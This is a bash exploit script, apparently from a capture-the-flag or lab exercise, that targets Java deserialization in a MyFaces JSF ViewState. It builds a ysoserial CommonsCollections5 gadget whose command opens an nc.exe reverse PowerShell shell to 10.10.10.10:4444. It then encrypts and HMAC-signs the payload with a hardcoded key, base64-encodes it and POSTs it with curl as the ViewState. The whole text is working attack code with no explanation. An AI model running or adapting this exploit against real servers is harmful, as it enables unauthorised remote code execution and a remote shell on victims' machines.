#!/bin/bash
java -jar /opt/yososerial/ysoserial-modified.jar CommonsCollections5 powershell 'C:\Windows\Temp\nc.exe -e c:\Windows\SysNative\WindowsPowershell\v1.0\Powershell.exe 10.10.10.10 4444' > yososerial.brute
openssl enc -des-ecb -in yososerial.brute -K aabbccddeeff001 -out yososerial.cipher
cat yososerial.cipher | openssl dgst -binary -sha1 -mac hmac -macopt hexkey:aabbccddeeff001 > yososerial.hmac

cat yososerial.cipher > payload
cat yososerial.hmac >> payload

base64 payload -w 0 > payload.b64
data=`cat payload.b64`

curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "JSESSIONID=8F35C3730A2783341B7EAF404CD96E57" -d "j_id_jsp_1623871077_1%3Aemail=null&j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&j_id_jsp_1623871077_1_SUBMIT=1" --data-urlencode "javax.faces.ViewState=$data" "http://10.10.10.10/myFaces.faces" --output /dev/null
